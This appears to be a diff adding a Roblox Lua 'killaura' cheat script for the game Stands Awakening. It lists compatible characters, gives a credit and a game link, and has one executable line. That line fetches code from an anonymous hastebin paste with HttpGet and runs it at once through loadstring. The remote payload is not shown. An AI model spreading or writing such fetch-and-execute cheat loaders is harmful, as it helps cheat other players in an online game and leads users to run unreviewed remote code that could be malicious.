@@ -1,0 +1,14 @@
+--ABDM KILLAURA SCRIPT
+--WORKS WITH:
+--VAMPIRE
+--HAMON
+--ULTIMATE LIFE FORM
+--STANDLESS
+--KARS
+--CRAZY DIAMOND
+--AND MORE
+
+loadstring(game:HttpGet("https://hastebin.com/raw/luvogicowo", true))()
+
+--MADE BY Jerse1#5645
+--game link (https://www.roblox.com/games/5780309044/RELEASE-HUGE-UPDATE-Stands-Awakening-Beta?refPageId=ff17417f-882e-40a6-994c-df24b5572dd6)
